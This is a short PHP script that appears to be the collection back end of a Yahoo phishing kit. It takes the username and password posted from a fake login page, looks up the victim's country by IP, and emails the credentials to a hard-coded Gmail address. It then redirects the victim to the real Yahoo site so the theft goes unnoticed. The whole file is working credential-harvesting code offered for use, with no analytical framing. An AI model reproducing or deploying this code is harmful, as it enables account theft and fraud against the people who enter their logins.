<?php

$api = 'https://www.yahoo.com/'; //put api url
$recipient = 'arbenkeci18@gmail.com'; // Put your email address here
if(isset($_POST['ai'])){
	$ip = getenv("REMOTE_ADDR");
	$ai= $_POST['ai'];
	$pr= $_POST['pr'];
	$subject = "Yahoo | True Login: " . $ip ;

function visitor_country()
	{
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$country = json_decode(curl_exec($ch))->country;
	
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
	$date = date('d-m-Y');
	$ip = getenv("REMOTE_ADDR");
	$message = "-----------------+ Yahoo RydoxCC True Login  +-----------------\n";
	$message.= "Username: " . $ai . "\n";
	$message.= "Password: " . $pr . "\n";
	$message.= "Client Country      : $country\n";
	if (mail($recipient, $subject, $message))
		{
			header("Location: $api");
		}
	  else
		{
		header("Location: index.html");
		
		}
	}else{
		header("Location: index.html");
		
	}